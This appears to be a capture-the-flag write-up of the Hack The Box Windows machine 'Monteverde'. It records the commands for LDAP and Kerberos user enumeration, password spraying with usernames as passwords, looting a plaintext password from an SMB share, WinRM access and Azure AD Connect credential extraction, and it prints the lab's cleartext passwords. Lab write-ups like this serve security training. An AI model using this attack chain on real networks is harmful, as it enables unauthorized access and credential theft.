---
title: "Monteverde - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - windows
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Monteverde
![](https://kar0nx.github.io/assets/images/writeup/00ceebe5dbef1106ce4390365cd787b4.png)
## Reconnaissance

IP: 10.10.10.172
## NMAP

```
nmap -T4 -p- -A 10.10.10.172
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-30 05:49 UTC
Nmap scan report for 10.10.10.172
Host is up (0.030s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-30 05:51:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49754/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-30T05:52:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -2s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   30.11 ms 10.10.14.1
2   30.20 ms 10.10.10.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.81 seconds
```

## SMB, LDAP

first gather domain name and users

```
nxc smb 10.10.10.172
nxc ldap 10.10.10.172 -u '' -p '' --query "(objectClass=*)" "*"
```

full ldap scan

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830075502.png)

scan for users:

```
nxc ldap 10.10.10.172 -u '' -p '' --query "(objectClass=*)" "userPrincipalName"
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830080041.png)

To confirm valid users I used kerbrute

```
kerbrute userenum -d MEGABANK.LOCAL --dc 10.10.10.172 users.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830081033.png)

Brute force with Welcome1 Passoword1 etc did nothing but when I use usernames as password I found valid credentials:

```
nxc smb 10.10.10.172 -u users.txt -p users.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830081907.png)

Fast scan with valid user I found few shares and new username AAD_987d7f2f57d2 (later I watched Ippsec video and he told that this is account for synchronise azure with local AD )

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830082222.png)

## Gaining Access

now let's enumerate shares.
In users share I found 4 users directory download it and chceck:

```
smbclient \\\\10.10.10.172\\users$ -U SABatchJobs
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830082858.png)

In mhope directory I found azure.xml file 
after opening file I spot the Password: 4n0therD4y@n0th3r$

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830083053.png)

confirm that this is mhope password 

```
nxc smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830084040.png)

now let's check for shares and winrm access:
We can connect via evil-winrm and grab user flag

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830084251.png)

## Privilege escalation

running winpeas I found that there is Cloud Credentials and mhope is in Azure Admins group

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830090228.png)

Searching google I found article how to extract this credentials
https://blog.xpnsec.com/azuread-connect-for-redteam/

this didn't work for me but I found simmilar 

https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1?source=post_page-----808ffe5cdded---------------------------------------

Get script on machine, Import module and we have example command in line 13/14 of script

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830092600.png)

administrator d0m@in4dminyeah!
confirming access and we can take root flag

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250830093015.png)
